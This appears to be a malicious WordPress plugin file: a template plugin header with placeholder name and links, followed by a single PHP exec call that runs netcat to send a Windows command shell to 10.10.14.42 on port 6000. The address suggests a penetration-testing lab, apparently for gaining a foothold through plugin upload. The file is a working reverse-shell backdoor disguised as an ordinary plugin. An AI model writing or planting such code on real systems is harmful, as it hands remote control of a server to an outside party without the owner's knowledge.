<?php
/*
Plugin Name: Name
Plugin URI:  http://link.com
Description: Describe what your plugin is all about in a few short sentences
Version:     1.0
Author:      Name
Author URI:  http://link.com
License:     GPL2 etc
License URI: http://link.com
*/

exec('nc.exe -e cmd.exe 10.10.14.42 6000');
?>